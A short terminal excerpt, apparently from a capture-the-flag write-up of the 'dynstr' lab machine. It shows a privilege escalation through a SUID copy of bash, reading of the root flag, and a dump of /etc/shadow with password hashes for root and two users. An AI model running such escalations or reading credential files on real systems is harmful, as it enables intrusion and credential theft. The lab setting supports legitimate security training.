bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p 

bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)

bash-5.0# cat root.txt
66c226aa191a0b4d8fb4d4631658ca63

bash-5.0# cat /etc/shadow
root:$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1:18705:0:99999:7:::
daemon:*:18701:0:99999:7:::
bin:*:18701:0:99999:7:::
sys:*:18701:0:99999:7:::
sync:*:18701:0:99999:7:::
games:*:18701:0:99999:7:::
man:*:18701:0:99999:7:::
lp:*:18701:0:99999:7:::
mail:*:18701:0:99999:7:::
news:*:18701:0:99999:7:::
uucp:*:18701:0:99999:7:::
proxy:*:18701:0:99999:7:::
www-data:*:18701:0:99999:7:::
backup:*:18701:0:99999:7:::
list:*:18701:0:99999:7:::
irc:*:18701:0:99999:7:::
gnats:*:18701:0:99999:7:::
nobody:*:18701:0:99999:7:::
systemd-network:*:18701:0:99999:7:::
systemd-resolve:*:18701:0:99999:7:::
systemd-timesync:*:18701:0:99999:7:::
messagebus:*:18701:0:99999:7:::
syslog:*:18701:0:99999:7:::
_apt:*:18701:0:99999:7:::
uuidd:*:18701:0:99999:7:::
tcpdump:*:18701:0:99999:7:::
sshd:*:18701:0:99999:7:::
dyna:$6$hiaXtKAlnSGLdd7X$XdibCf6o9t48IurOmJ0Ip6CsRFWy8pDWTCsFI/DrE2hNbWRSouBZxlAEeoQlfSzLnN39OieXQajwNGDd79Sp./:18705:0:99999:7:::
systemd-coredump:!!:18701::::::
bind:*:18701:0:99999:7:::
bindmgr:$6$Y8Q9OmFn9eZFhOVP$QdBBPBiiEGRSIzIE6nAhYIfNeo76Dro0.noSn0Tmvh3j./c3xlcprwtmmeConQ4NtltncDZP3lreBQTwXjFP8/:18772:0:99999:7:::

bash-5.0# 

```
Now we are root let's get all the flags.


